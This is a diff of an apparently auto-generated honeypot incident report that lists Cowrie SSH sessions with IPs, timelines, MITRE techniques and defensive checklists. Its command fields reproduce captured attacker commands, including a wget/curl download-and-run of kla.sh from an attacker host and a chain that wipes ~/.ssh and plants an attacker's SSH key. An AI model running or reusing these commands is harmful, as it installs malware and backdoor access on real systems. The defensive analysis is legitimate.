 | **Auth Success** | ✅ Yes — session established |
 | **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
@@ -280,13 +579,13 @@ Source IPs: `160.119.66.206`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 00:02:40` | `cowrie.session.connect` |
-| `2026-11-19 00:02:40` | `cowrie.client.version` |
-| `2026-11-19 00:02:40` | `cowrie.client.kex` |
-| `2026-11-19 00:02:40` | `cowrie.login.success` |
-| `2026-11-19 00:02:41` | `cowrie.direct-tcpip.request` |
-| `2026-11-19 00:02:41` | `cowrie.direct-tcpip.data` |
-| `2026-11-19 00:02:41` | `cowrie.session.closed` |
+| `2026-11-19 03:45:48` | `cowrie.session.connect` |
+| `2026-11-19 03:45:48` | `cowrie.client.version` |
+| `2026-11-19 03:45:48` | `cowrie.client.kex` |
+| `2026-11-19 03:45:49` | `cowrie.login.success` |
+| `2026-11-19 03:45:49` | `cowrie.direct-tcpip.request` |
+| `2026-11-19 03:45:49` | `cowrie.direct-tcpip.data` |
+| `2026-11-19 03:45:49` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `93.152.221[.]51` to AbuseIPDB if not already reported
@@ -295,232 +594,13 @@ Source IPs: `160.119.66.206`
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-58066add2b2c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `160.119.66[.]206` |
-| **First Seen** | 2026-11-19 00:07 |
-| **Last Seen** | 2026-11-19 00:07 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
-| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
-| **Malware Analysis** | 39be6853a8204ce6455a373a6ffb4cb4672d4a62d90be69f7d6eeb66cda10b96 (MEDIUM) |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:07:09` | `cowrie.session.connect` |
-| `2026-11-19 00:07:09` | `cowrie.login.success` |
-| `2026-11-19 00:07:09` | `cowrie.session.params` |
-| `2026-11-19 00:07:09` | `cowrie.command.input` |
-| `2026-11-19 00:07:09` | `cowrie.command.failed` |
-| `2026-11-19 00:07:10` | `cowrie.command.input` |
-| `2026-11-19 00:07:10` | `cowrie.command.failed` |
-| `2026-11-19 00:07:10` | `cowrie.command.input` |
-| `2026-11-19 00:07:10` | `cowrie.command.failed` |
-| `2026-11-19 00:07:10` | `cowrie.command.input` |
-| `2026-11-19 00:07:10` | `cowrie.command.input` |
-| `2026-11-19 00:07:10` | `cowrie.command.input` |
-| `2026-11-19 00:07:11` | `cowrie.session.file_download` |
-| `2026-11-19 00:07:11` | `cowrie.session.file_download` |
-| `2026-11-19 00:07:12` | `cowrie.session.file_download` |
-| … | _3 more event(s) — see ir_cases.json_ |
-
-**Recommended Actions:**
-- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
-- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-930da903a95e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `192.141.148[.]99` |
-| **First Seen** | 2026-11-19 00:07 |
-| **Last Seen** | 2026-11-19 00:07 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `scp -t /tmp/F8cE9Dun` |
-| **Download Attempts** | 9cbbeb3f16791eb75f9dd1311268e2d6f584d442320b1ff453c5e12903b30f7b |
-| **Malware Analysis** | 9cbbeb3f16791eb75f9dd1311268e2d6f584d442320b1ff453c5e12903b30f7b (MEDIUM) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:07:09` | `cowrie.session.connect` |
-| `2026-11-19 00:07:10` | `cowrie.client.version` |
-| `2026-11-19 00:07:10` | `cowrie.client.kex` |
-| `2026-11-19 00:07:11` | `cowrie.login.success` |
-| `2026-11-19 00:07:12` | `cowrie.client.var` |
-| `2026-11-19 00:07:13` | `cowrie.session.params` |
-| `2026-11-19 00:07:13` | `cowrie.command.input` |
-| `2026-11-19 00:07:13` | `cowrie.session.file_download` |
-| `2026-11-19 00:07:13` | `cowrie.log.closed` |
-| `2026-11-19 00:07:13` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `192.141.148[.]99` to AbuseIPDB if not already reported
-- [ ] Block `192.141.148[.]99` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-559483104fa1
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `160.119.66[.]206` |
-| **First Seen** | 2026-11-19 00:07 |
-| **Last Seen** | 2026-11-19 00:07 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
-| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
-| **Malware Analysis** | 39be6853a8204ce6455a373a6ffb4cb4672d4a62d90be69f7d6eeb66cda10b96 (MEDIUM) |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:07:11` | `cowrie.session.connect` |
-| `2026-11-19 00:07:11` | `cowrie.login.success` |
-| `2026-11-19 00:07:11` | `cowrie.session.params` |
-| `2026-11-19 00:07:12` | `cowrie.command.input` |
-| `2026-11-19 00:07:12` | `cowrie.session.file_download` |
-| `2026-11-19 00:07:13` | `cowrie.session.file_download` |
-| `2026-11-19 00:07:13` | `cowrie.session.file_download` |
-| `2026-11-19 00:07:13` | `cowrie.session.file_download.failed` |
-| `2026-11-19 00:07:14` | `cowrie.log.closed` |
-| `2026-11-19 00:07:15` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
-- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-113217a698a4
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `192.141.148[.]99` |
-| **First Seen** | 2026-11-19 00:07 |
-| **Last Seen** | 2026-11-19 00:07 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd /tmp && chmod +x F8cE9Dun && bash -c ./F8cE9Dun, ./F8cE9Dun` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:07:13` | `cowrie.session.connect` |
-| `2026-11-19 00:07:14` | `cowrie.client.version` |
-| `2026-11-19 00:07:14` | `cowrie.client.kex` |
-| `2026-11-19 00:07:15` | `cowrie.login.success` |
-| `2026-11-19 00:07:16` | `cowrie.client.var` |
-| `2026-11-19 00:07:16` | `cowrie.session.params` |
-| `2026-11-19 00:07:16` | `cowrie.command.input` |
-| `2026-11-19 00:07:16` | `cowrie.command.input` |
-| `2026-11-19 00:07:16` | `cowrie.command.failed` |
-| `2026-11-19 00:07:16` | `cowrie.log.closed` |
-| `2026-11-19 00:07:17` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `192.141.148[.]99` to AbuseIPDB if not already reported
-- [ ] Block `192.141.148[.]99` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-f86101c7a85a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `69.5.20[.]205` |
-| **First Seen** | 2026-11-19 00:08 |
-| **Last Seen** | 2026-11-19 00:08 |
-| **Session Duration** | 12s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:08:11` | `cowrie.session.connect` |
-| `2026-11-19 00:08:11` | `cowrie.client.version` |
-| `2026-11-19 00:08:11` | `cowrie.client.kex` |
-| `2026-11-19 00:08:12` | `cowrie.login.success` |
-| `2026-11-19 00:08:13` | `cowrie.session.params` |
-| `2026-11-19 00:08:13` | `cowrie.command.input` |
-| `2026-11-19 00:08:13` | `cowrie.command.failed` |
-| `2026-11-19 00:08:14` | `cowrie.log.closed` |
-| `2026-11-19 00:08:15` | `cowrie.session.params` |
-| `2026-11-19 00:08:15` | `cowrie.command.input` |
-| `2026-11-19 00:08:15` | `cowrie.session.file_download` |
-| `2026-11-19 00:08:15` | `cowrie.log.closed` |
-| `2026-11-19 00:08:24` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `69.5.20[.]205` to AbuseIPDB if not already reported
-- [ ] Block `69.5.20[.]205` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-e9a1597a735c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `69.5.20[.]205` |
-| **First Seen** | 2026-11-19 00:08 |
-| **Last Seen** | 2026-11-19 00:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:08:15` | `cowrie.session.connect` |
-| `2026-11-19 00:08:15` | `cowrie.client.version` |
-| `2026-11-19 00:08:16` | `cowrie.client.kex` |
-| `2026-11-19 00:08:17` | `cowrie.login.success` |
-| `2026-11-19 00:08:17` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `69.5.20[.]205` to AbuseIPDB if not already reported
-- [ ] Block `69.5.20[.]205` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-2f22a70d2ab5
+### 🔴 HIGH · IR-77c4e4c97a90
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `195.178.110[.]78` |
-| **First Seen** | 2026-11-19 00:22 |
-| **Last Seen** | 2026-11-19 00:22 |
+| **First Seen** | 2026-11-19 03:54 |
+| **Last Seen** | 2026-11-19 03:54 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -530,24 +610,123 @@ Source IPs: `160.119.66.206`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 00:22:48` | `cowrie.session.connect` |
-| `2026-11-19 00:22:48` | `cowrie.login.success` |
-| `2026-11-19 00:22:48` | `cowrie.session.params` |
-| `2026-11-19 00:22:49` | `cowrie.log.closed` |
-| `2026-11-19 00:22:49` | `cowrie.session.closed` |
+| `2026-11-19 03:54:10` | `cowrie.session.connect` |
+| `2026-11-19 03:54:11` | `cowrie.login.success` |
+| `2026-11-19 03:54:12` | `cowrie.session.params` |
+| `2026-11-19 03:54:12` | `cowrie.log.closed` |
+| `2026-11-19 03:54:12` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
 - [ ] Block `195.178.110[.]78` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-078597858331
+### 🔴 HIGH · IR-5218f0fdf6ab
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `109.160.32[.]154` |
+| **First Seen** | 2026-11-19 04:00 |
+| **Last Seen** | 2026-11-19 04:00 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `uname -s -v -n -r -m` |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:00:01` | `cowrie.session.connect` |
+| `2026-11-19 04:00:01` | `cowrie.client.version` |
+| `2026-11-19 04:00:02` | `cowrie.client.kex` |
+| `2026-11-19 04:00:02` | `cowrie.login.success` |
+| `2026-11-19 04:00:03` | `cowrie.session.params` |
+| `2026-11-19 04:00:03` | `cowrie.command.input` |
+| `2026-11-19 04:00:03` | `cowrie.log.closed` |
+| `2026-11-19 04:00:03` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `109.160.32[.]154` to AbuseIPDB if not already reported
+- [ ] Block `109.160.32[.]154` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-1268981d4d73
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `180.76.242[.]143` |
+| **First Seen** | 2026-11-19 04:08 |
+| **Last Seen** | 2026-11-19 04:08 |
+| **Session Duration** | 11s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
+| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
+| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:08:04` | `cowrie.session.connect` |
+| `2026-11-19 04:08:04` | `cowrie.client.version` |
+| `2026-11-19 04:08:04` | `cowrie.client.kex` |
+| `2026-11-19 04:08:06` | `cowrie.login.success` |
+| `2026-11-19 04:08:09` | `cowrie.session.params` |
+| `2026-11-19 04:08:09` | `cowrie.command.input` |
+| `2026-11-19 04:08:09` | `cowrie.command.failed` |
+| `2026-11-19 04:08:09` | `cowrie.log.closed` |
+| `2026-11-19 04:08:10` | `cowrie.session.params` |
+| `2026-11-19 04:08:10` | `cowrie.command.input` |
+| `2026-11-19 04:08:10` | `cowrie.session.file_download` |
+| `2026-11-19 04:08:10` | `cowrie.log.closed` |
+| `2026-11-19 04:08:15` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `180.76.242[.]143` to AbuseIPDB if not already reported
+- [ ] Block `180.76.242[.]143` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Submit download hash(es) to VirusTotal
+- [ ] Run Tool 31 malware analyzer on captured payload(s)
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-b242dd71e66c
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `180.76.242[.]143` |
+| **First Seen** | 2026-11-19 04:08 |
+| **Last Seen** | 2026-11-19 04:08 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:08:11` | `cowrie.session.connect` |
+| `2026-11-19 04:08:11` | `cowrie.client.version` |
+| `2026-11-19 04:08:11` | `cowrie.client.kex` |
+| `2026-11-19 04:08:12` | `cowrie.login.success` |
+| `2026-11-19 04:08:13` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `180.76.242[.]143` to AbuseIPDB if not already reported
+- [ ] Block `180.76.242[.]143` at perimeter firewall / security group
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-b0f900a16c4d
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `77.239.124[.]252` |
-| **First Seen** | 2026-11-19 00:29 |
-| **Last Seen** | 2026-11-19 00:29 |
+| **First Seen** | 2026-11-19 04:11 |
+| **Last Seen** | 2026-11-19 04:11 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -557,130 +736,64 @@ Source IPs: `160.119.66.206`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 00:29:09` | `cowrie.session.connect` |
-| `2026-11-19 00:29:09` | `cowrie.login.success` |
-| `2026-11-19 00:29:10` | `cowrie.session.params` |
-| `2026-11-19 00:29:10` | `cowrie.log.closed` |
-| `2026-11-19 00:29:10` | `cowrie.session.closed` |
+| `2026-11-19 04:11:23` | `cowrie.session.connect` |
+| `2026-11-19 04:11:24` | `cowrie.login.success` |
+| `2026-11-19 04:11:24` | `cowrie.session.params` |
+| `2026-11-19 04:11:24` | `cowrie.log.closed` |
+| `2026-11-19 04:11:24` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `77.239.124[.]252` to AbuseIPDB if not already reported
 - [ ] Block `77.239.124[.]252` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-c0882dd50491
+### 🔴 HIGH · IR-722ee712f023
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `77.90.185[.]29` |
-| **First Seen** | 2026-11-19 00:39 |
-| **Last Seen** | 2026-11-19 00:39 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:39:06` | `cowrie.session.connect` |
-| `2026-11-19 00:39:06` | `cowrie.client.version` |
-| `2026-11-19 00:39:07` | `cowrie.client.kex` |
-| `2026-11-19 00:39:07` | `cowrie.login.success` |
-| `2026-11-19 00:39:07` | `cowrie.direct-tcpip.request` |
-| `2026-11-19 00:39:07` | `cowrie.direct-tcpip.ja4` |
-| `2026-11-19 00:39:07` | `cowrie.direct-tcpip.data` |
-| `2026-11-19 00:39:08` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.90.185[.]29` to AbuseIPDB if not already reported
-- [ ] Block `77.90.185[.]29` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-325cb308414b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `80.94.95[.]118` |
-| **First Seen** | 2026-11-19 00:39 |
-| **Last Seen** | 2026-11-19 00:39 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:39:13` | `cowrie.session.connect` |
-| `2026-11-19 00:39:13` | `cowrie.client.version` |
-| `2026-11-19 00:39:13` | `cowrie.client.kex` |
-| `2026-11-19 00:39:13` | `cowrie.login.success` |
-| `2026-11-19 00:39:13` | `cowrie.direct-tcpip.request` |
-| `2026-11-19 00:39:13` | `cowrie.direct-tcpip.ja4` |
-| `2026-11-19 00:39:13` | `cowrie.direct-tcpip.data` |
-| `2026-11-19 00:39:14` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
-- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d5fd65533de0
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `118.196.152[.]44` |
-| **First Seen** | 2026-11-19 00:39 |
-| **Last Seen** | 2026-11-19 00:44 |
-| **Session Duration** | 301s |
+| **Source IP** | `103.189.208[.]13` |
+| **First Seen** | 2026-11-19 04:13 |
+| **Last Seen** | 2026-11-19 04:13 |
+| **Session Duration** | 9s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
 | **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
 | **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
 | **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
 
 **Attack Timeline:**
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 00:39:52` | `cowrie.session.connect` |
-| `2026-11-19 00:39:52` | `cowrie.client.version` |
-| `2026-11-19 00:39:52` | `cowrie.client.kex` |
-| `2026-11-19 00:39:53` | `cowrie.login.success` |
-| `2026-11-19 00:39:54` | `cowrie.session.params` |
-| `2026-11-19 00:39:54` | `cowrie.command.input` |
-| `2026-11-19 00:39:54` | `cowrie.command.failed` |
-| `2026-11-19 00:39:54` | `cowrie.log.closed` |
-| `2026-11-19 00:39:55` | `cowrie.session.params` |
-| `2026-11-19 00:39:55` | `cowrie.command.input` |
-| `2026-11-19 00:39:56` | `cowrie.session.file_download` |
-| `2026-11-19 00:39:56` | `cowrie.log.closed` |
-| `2026-11-19 00:44:53` | `cowrie.session.closed` |
+| `2026-11-19 04:13:44` | `cowrie.session.connect` |
+| `2026-11-19 04:13:44` | `cowrie.client.version` |
+| `2026-11-19 04:13:44` | `cowrie.client.kex` |
+| `2026-11-19 04:13:45` | `cowrie.login.success` |
+| `2026-11-19 04:13:46` | `cowrie.session.params` |
+| `2026-11-19 04:13:46` | `cowrie.command.input` |
+| `2026-11-19 04:13:46` | `cowrie.command.failed` |
+| `2026-11-19 04:13:47` | `cowrie.log.closed` |
+| `2026-11-19 04:13:47` | `cowrie.session.params` |
+| `2026-11-19 04:13:47` | `cowrie.command.input` |
+| `2026-11-19 04:13:48` | `cowrie.session.file_download` |
+| `2026-11-19 04:13:48` | `cowrie.log.closed` |
+| `2026-11-19 04:13:54` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `118.196.152[.]44` to AbuseIPDB if not already reported
-- [ ] Block `118.196.152[.]44` at perimeter firewall / security group
+- [ ] Submit `103.189.208[.]13` to AbuseIPDB if not already reported
+- [ ] Block `103.189.208[.]13` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Submit download hash(es) to VirusTotal
+- [ ] Run Tool 31 malware analyzer on captured payload(s)
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-4684f4d97094
+### 🔴 HIGH · IR-28b0b9e23645
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `118.196.152[.]44` |
-| **First Seen** | 2026-11-19 00:39 |
-| **Last Seen** | 2026-11-19 00:39 |
+| **Source IP** | `103.189.208[.]13` |
+| **First Seen** | 2026-11-19 04:13 |
+| **Last Seen** | 2026-11-19 04:13 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -690,438 +803,397 @@ Source IPs: `160.119.66.206`
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 00:39:56` | `cowrie.session.connect` |
-| `2026-11-19 00:39:56` | `cowrie.client.version` |
-| `2026-11-19 00:39:56` | `cowrie.client.kex` |
-| `2026-11-19 00:39:57` | `cowrie.login.success` |
-| `2026-11-19 00:39:57` | `cowrie.session.closed` |
+| `2026-11-19 04:13:48` | `cowrie.session.connect` |
+| `2026-11-19 04:13:48` | `cowrie.client.version` |
+| `2026-11-19 04:13:48` | `cowrie.client.kex` |
+| `2026-11-19 04:13:49` | `cowrie.login.success` |
+| `2026-11-19 04:13:50` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `118.196.152[.]44` to AbuseIPDB if not already reported
-- [ ] Block `118.196.152[.]44` at perimeter firewall / security group
+- [ ] Submit `103.189.208[.]13` to AbuseIPDB if not already reported
+- [ ] Block `103.189.208[.]13` at perimeter firewall / security group
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-b603e38ba349
+### 🔴 HIGH · IR-361a2a9ab121
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `138.226.239[.]234` |
-| **First Seen** | 2026-11-19 00:40 |
-| **Last Seen** | 2026-11-19 00:40 |
+| **Source IP** | `80.94.92[.]179` |
+| **First Seen** | 2026-11-19 04:25 |
+| **Last Seen** | 2026-11-19 04:25 |
+| **Session Duration** | 12s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_43200e4abbb9ec36dff034eeeeb279e3_small_control'"'"' '"'"'check_43200e4abbb9ec36dff034eeeeb279e3'"'"'', printf '\n%s|%s\n' 'check_43200e4abbb9ec36dff034eeeeb279e3_small_control' 'check_43200e4abbb9ec36dff034eeeeb279e3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_43200e4abbb9ec36dff034eeeeb279e3_small_math'"'"' "$((236*686+16))"', (236*686+16, printf '\n%s|%s\n' 'check_43200e4abbb9ec36dff034eeeeb279e3_small_math' ")"` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:25:08` | `cowrie.session.connect` |
+| `2026-11-19 04:25:09` | `cowrie.client.version` |
+| `2026-11-19 04:25:09` | `cowrie.client.kex` |
